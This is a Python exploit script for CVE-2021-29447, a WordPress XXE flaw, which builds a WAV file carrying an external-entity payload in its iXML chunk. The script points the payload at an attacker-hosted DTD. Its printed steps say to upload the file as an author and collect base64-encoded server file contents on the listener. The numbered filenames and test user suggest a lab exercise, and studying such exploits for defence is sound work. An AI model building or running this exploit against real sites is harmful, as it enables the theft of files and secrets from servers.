#!/usr/bin/env python3
"""
CVE-2021-29447 — WordPress XXE via Audio Metadata
Generates a malicious WAV file embedding an XXE payload.

Usage:
    python3 1_create_wav.py --dtd http://YOUR_IP:PORT/2_evil.dtd
"""
import struct
import argparse
import os

def build_wav(dtd_url: str) -> bytes:
    # XML prolog that triggers the XXE when parsed by getID3/libxml2
    xml = (
        f'<?xml version="1.0"?>'
        f'<!DOCTYPE foo ['
        f'<!ENTITY % xxe SYSTEM "{dtd_url}">'
        f' %xxe;'
        f']>\n'
    ).encode()

    # ── fmt subchunk (PCM, mono, 44100 Hz, 16-bit) ──
    fmt = (
        b'fmt '
        + struct.pack('<I', 16)   # chunk size
        + struct.pack('<H', 1)    # PCM
        + struct.pack('<H', 1)    # mono
        + struct.pack('<I', 44100)
        + struct.pack('<I', 88200)
        + struct.pack('<H', 2)    # block align
        + struct.pack('<H', 16)   # bits/sample
    )

    # ── iXML subchunk containing the XML payload ──
    # Must use 'iXML' (not 'data') — getID3 parses iXML chunk content via
    # simplexml_load_string(LIBXML_NOENT) in getid3.lib.php:730
    ixml = b'iXML' + struct.pack('<I', len(xml)) + xml

    # ── RIFF container ──
    body     = b'WAVE' + fmt + ixml
    riff_hdr = b'RIFF' + struct.pack('<I', len(body))

    return riff_hdr + body


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('--dtd', required=True,
                    help='Full URL to evil.dtd on your listener (e.g. http://172.17.0.1:8888/2_evil.dtd)')
    ap.add_argument('--out', default='malicious.wav',
                    help='Output WAV filename (default: malicious.wav)')
    args = ap.parse_args()

    wav = build_wav(args.dtd)
    with open(args.out, 'wb') as f:
        f.write(wav)

    print(f'[+] Malicious WAV written: {args.out}  ({len(wav)} bytes)')
    print(f'[+] XXE will fetch DTD from: {args.dtd}')
    print()
    print('Next steps:')
    print('  1. Edit 2_evil.dtd — set YOUR_IP and YOUR_PORT')
    print('  2. Serve it: python3 -m http.server YOUR_PORT')
    print('  3. Upload malicious.wav to WordPress Media Library (as j.doe / author)')
    print('  4. Watch your HTTP server for the base64-encoded file contents')


if __name__ == '__main__':
    main()
